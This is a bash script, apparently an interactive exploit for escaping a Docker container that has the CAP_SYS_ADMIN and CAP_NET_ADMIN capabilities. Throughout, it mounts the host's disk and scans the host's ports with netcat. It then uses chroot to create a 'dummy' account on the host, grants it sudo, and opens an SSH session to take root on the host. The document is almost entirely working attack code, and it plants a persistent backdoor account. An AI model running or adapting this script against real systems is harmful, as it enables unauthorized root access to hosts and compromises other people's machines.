#!/bin/bash

# This is the code for the SSH to Host exploit.
# Here I exploit two capabilities: CAP_SYS_ADMIN and CAP_NET_ADMIN.
# This two capabilities can be used respectively to mount the host
# filesystem (i.e., mouting the device in which it is mounted),
# creating a new dummy user to give him sudo access, scan for open
# ports in the Docker host, start/stop the SSH service, find the IP
# of the container's gateway and, finally, establish an SSH connection
# with the newly created dummy user. This will leads to a privilege
# escalation attacks. At the end we have root access of the host. 

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "[*] ${GREEN}Installing the following packages"
echo -e "    + libcap2/libcap2-bin (for the capsh tool)"
echo -e "    + fdisk (for the fdisk utility)"
echo -e "    + build-essential (for missing default tools)"
echo -e "    + findmnt (to find all mounts points and apply filters)"
echo -e "    + jq (to handle JSON output)"
echo -e "    + netcat (for open ports)"
echo -e "    + openssh-server (for SSH server)"
echo -e "    + net-tools (for get network configurations)${NC}"

apt update && apt install -y netcat fdisk build-essential net-tools \
			     openssh-server libcap2-bin jq findmnt

stty erase ^H

echo -e "[*] ${GREEN}Installing Finished${NC}"
echo -e "[*] ${GREEN}Check for the CAP_SYS_ADMIN capability and CAP_NET_ADMIN availability${NC}"
capsys=$(capsh --print | grep -E '[^!]cap_sys_admin') # Check if CAP_SYS_ADMIN capability is activated
capnet=$(capsh --print | grep -E '[^!]cap_net_admin') # Check if CAP_NET_ADMIN capability is activated
if [[ ! -z ${capsys} && ! -z ${capnet} ]]; then
	echo -e "[*] ${GREEN}CAP_SYS_ADMIN capability found${NC}"
	echo -e "[*] ${GREEN}CAP_NET_ADMIN capability found${NC}"
else
	echo -e "[*] ${RED}CAP_SYS_ADMIN capability not found. Impossibility to continue.${NC}"
	echo -e "[*] ${RED}CAP_NET_ADMIN capability not found. Impossibility to continue.${NC}"
	echo -e "[*] ${RED}Exiting ...${NC}"
	exit 1
fi;

echo -e "[*] ${GREEN}Check if there is a device that mount the host filesystem${NC}\n"
fdisk -l  # Check if there is a device that mount the host filesystem

echo -e "[*] ${YELLOW}Type the device: ${NC}" 
read dev

echo -e "[*] ${GREEN}Check if the host filesystem" ${dev} "is already mounted${NC}"
ismounted=$(findmnt --source ${dev} --json | jq '.filesystems[] | select(.source == "'${dev}'") | .target')
test ! -z ${ismounted} && echo -e "[*] ${GREEN}" ${dev} "is mounted on" ${ismounted} "${NC}" || echo -e "[*] ${YELLOW}" ${dev} "is not mounted${NC}"

dest="/tmp"
echo "[*] ${YELLOW}Type a destination: (default /tmp) ${NC}"
read dest

if [[ -z ${ismounted} ]]; then
	echo -e "[*] ${GREEN}Check if" ${dest} "already exists${NC}"
	# Check if the directory exists or not
	if [[ -d ${dest} ]]; then
		echo -e "[*] ${GREEN}" ${dest} "created${NC}"
		mkdir -p ${dest}
	fi;

	echo -e "[*] ${GREEN}Mouting" ${dev} "to" ${dest} "${NC}"
	mount ${dev} ${dest}  # Mount the device on the destination
fi;

echo -e "[*] ${GREEN}Get IP addresses${NC}"
ifconfig  # get IP address

echo -e "[*] ${YELLOW}Type the IP address of the host: (usually 172.17.0.1) ${NC}"
read ip

echo -e "[*] ${GREEN}Check for open ports to an SSH server${NC}"
nc -vn -w2 -z ${ip} 1-65535 2>&1 | grep succeeded  # Checks for opern ports

echo -e "[*] ${YELLOW}It is open? (leave blank for NO) "
read ans
test ! -z ${ans} && echo -e "[*] ${GREEN}Start the SSH server${NC}" || (echo -e "[*] ${RED}Can't continue. Exiting ...${NC}" && exit 1)

service ssh start  # Start the SSH service

echo -e "[*] ${GREEN}Creating a new user named: dummy${NC}"
chroot ${dest} adduser dummy  # Create a new dummy user

echo -e "[*] ${GREEN}Giving dummy sudo privileges${NC}"
chroot ${dest} usermod -aG sudo dummy  # Gives dummy sudo privileges

echo -e "[*] ${GREEN}Remote connection with dummy${NC}"
ssh dummy@172.17.0.1

echo -e "[*] ${GREEN}Terminating ... ${NC}"
